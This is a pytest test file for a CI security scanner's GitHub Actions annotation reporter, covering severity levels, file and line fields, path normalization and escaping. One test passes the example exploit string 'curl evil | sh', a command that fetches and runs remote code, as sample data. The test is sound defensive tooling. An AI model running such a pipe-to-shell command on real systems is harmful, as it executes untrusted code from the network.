"""Tests for the GitHub Actions annotations reporter."""
from __future__ import annotations

from pipeline_check.core.checks.base import Finding, Location, Severity
from pipeline_check.core.github_annotations_reporter import (
    report_github_annotations,
)


def _f(check_id="GHA-001", passed=False, severity=Severity.HIGH, **kw):
    return Finding(
        check_id=check_id,
        title=kw.get("title", "Example finding"),
        severity=severity,
        resource=kw.get("resource", ".github/workflows/ci.yml"),
        description=kw.get("description", "Something is wrong."),
        recommendation=kw.get("recommendation", "Fix it."),
        passed=passed,
        exploit_example=kw.get("exploit_example", None),
        locations=kw.get("locations", []),
    )


def _lines(text: str) -> list[str]:
    return [ln for ln in text.splitlines() if ln.startswith("::")]


class TestLevels:
    def test_critical_and_high_are_errors(self):
        out = report_github_annotations([
            _f(check_id="A", severity=Severity.CRITICAL),
            _f(check_id="B", severity=Severity.HIGH),
        ])
        assert all(ln.startswith("::error ") for ln in _lines(out))

    def test_medium_is_warning_low_is_notice(self):
        out = report_github_annotations([
            _f(check_id="M", severity=Severity.MEDIUM),
            _f(check_id="L", severity=Severity.LOW),
        ])
        lines = _lines(out)
        assert any(ln.startswith("::warning ") for ln in lines)
        assert any(ln.startswith("::notice ") for ln in lines)


class TestProperties:
    def test_file_line_and_title_present(self):
        f = _f(check_id="GHA-008", title="Literal secret",
               locations=[Location(path=".github/workflows/ci.yml", start_line=31)])
        line = _lines(report_github_annotations([f]))[0]
        assert "file=.github/workflows/ci.yml" in line
        assert "line=31" in line
        # The title carries the check id; its ``:`` is percent-encoded.
        assert "title=GHA-008%3A Literal secret" in line

    def test_path_is_normalized_to_forward_slashes(self):
        f = _f(locations=[Location(path="dir\\sub\\ci.yml", start_line=1)])
        line = _lines(report_github_annotations([f]))[0]
        assert "file=dir/sub/ci.yml" in line

    def test_no_location_emits_general_annotation(self):
        line = _lines(report_github_annotations([_f(locations=[])]))[0]
        assert "file=" not in line
        assert line.startswith("::error title=")


class TestFilteringAndEscaping:
    def test_passing_findings_excluded(self):
        out = report_github_annotations([
            _f(check_id="A-1", passed=True),
            _f(check_id="A-2", passed=False),
        ])
        lines = _lines(out)
        assert len(lines) == 1 and "A-2" in lines[0]

    def test_message_newlines_are_percent_encoded(self):
        out = report_github_annotations([_f(description="line one\nline two")])
        line = _lines(out)[0]
        assert "%0A" in line and "\n" not in line.split("::", 2)[-1]

    def test_inline_explain_appends_exploit(self):
        f = _f(exploit_example="curl evil | sh")
        line = _lines(report_github_annotations([f], inline_explain=True))[0]
        assert "Proof of exploit" in line and "curl evil | sh" in line
